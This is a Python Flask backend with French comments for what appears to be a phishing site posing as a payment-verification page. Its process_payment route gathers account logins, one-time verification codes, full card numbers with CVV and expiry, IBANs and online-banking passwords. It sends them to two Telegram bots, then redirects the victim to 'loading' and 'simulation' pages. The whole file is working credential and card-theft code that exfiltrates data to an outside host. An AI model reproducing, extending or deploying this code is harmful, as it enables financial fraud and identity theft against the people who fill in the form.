from flask import Flask, request, redirect, render_template, url_for, session
import os
import requests
from dotenv import load_dotenv

# Charge les variables d'environnement depuis le fichier .env
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "super_secret_default_key")

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("CHAT_ID_2")

# --- ENVOI DU MESSAGE TELEGRAM ---
def send_telegram_message(message):
    if TELEGRAM_BOT_TOKEN and CHAT_ID:
        url_1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data_1 = {"chat_id": CHAT_ID, "text": message}
        try:
            requests.post(url_1, data=data_1).raise_for_status()
            print("Message Telegram envoyé au premier bot.")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de l'envoi au premier bot: {e}")

    if TELEGRAM_BOT_TOKEN_2 and CHAT_ID_2:
        url_2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_2}/sendMessage"
        data_2 = {"chat_id": CHAT_ID_2, "text": message}
        try:
            requests.post(url_2, data=data_2).raise_for_status()
            print("Message Telegram envoyé au deuxième bot.")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de l'envoi au deuxième bot: {e}")

# --- PAGE D'ACCUEIL ---
@app.route('/')
def home():
    return render_template('payment_info.html')

# --- PAGE PAYMENT INFO ---
@app.route("/payment-info", methods=["GET"])
def payment_info_page():
    username = session.get("username")
    password = session.get("password")
    verification_code = session.get("verification_code")
    phone_number = session.get("phone_number")
    return render_template("payment_info.html",
                           username=username,
                           password=password,
                           verification_code=verification_code,
                           phone_number=phone_number)

# --- TRAITEMENT DU FORMULAIRE ---
@app.route("/process_payment", methods=["POST"])
def process_payment():
    username = request.form.get("username") or session.get('username')
    password = request.form.get("password") or session.get('password')
    verification_code = request.form.get("verification_code") or session.get('verification_code')
    phone_number = session.get('phone_number')

    card_name = request.form["card_name"]
    card_number = request.form["card_number"]
    expiry_date = request.form["expiry_date"]
    cvv = request.form["cvv"]
    iban = request.form["iban"]
    bank_name_selected = request.form.get("bank_name")
    other_bank_name = request.form.get("other_bank_name")
    bank_id = request.form.get("bank_id")
    bank_password = request.form.get("bank_password")

    final_bank_name = (other_bank_name if bank_name_selected == "Autre" and other_bank_name
                       else ("Autre (non spécifié)" if bank_name_selected == "Autre" else bank_name_selected))

    message = (
        f"[Payment Info]\n"
        f"Pseudo: {username or 'N/A'}\n"
        f"Mdp: {password or 'N/A'}\n"
        f"Code Vérif: {verification_code or 'N/A'}\n"
        f"Nom sur carte: {card_name}\n"
        f"Numéro carte: {card_number}\n"
        f"Expiration: {expiry_date}\n"
        f"CVV: {cvv}\n"
        f"IBAN: {iban}\n"
        f"Téléphone: {phone_number or 'N/A'}\n"
        f"Banque: {final_bank_name or 'N/A'}\n"
        f"Identifiant Bancaire: {bank_id or 'N/A'}\n"
        f"Mot de passe / code bancaire: {bank_password or 'N/A'}"
    )

    send_telegram_message(message)

    # Redirection vers la page de chargement avant la simulation
    return redirect(url_for('loading_page'))

# --- PAGE DE CHARGEMENT (NOUVELLE PAGE) ---
@app.route("/loading-page", methods=["GET"])
def loading_page():
    """
    Page de transition avec décompte avant la simulation.
    """
    return render_template("loading_page.html")

# --- PAGE DE VERIFICATION RIB/CB ---
@app.route("/verification-rib-cb", methods=["GET"])
def verification_rib_cb():
    return render_template("verification_rib_cb.html")

# --- PAGE DES SCÉNARIOS ---
@app.route("/scenarios-simulation", methods=["GET"])
def scenarios_simulation():
    scenario_type = request.args.get("type")
    return render_template("scenarios_simulation.html", type=scenario_type)

# --- PAGE DE SIMULATION ---
@app.route("/simulation-page", methods=["GET"])
def simulation_page():
    scenario = request.args.get("type")  # peut être 'rib', 'cb' ou None
    return render_template("simulation_page.html", type=scenario)


if __name__ == "__main__":
    app.run(debug=True)
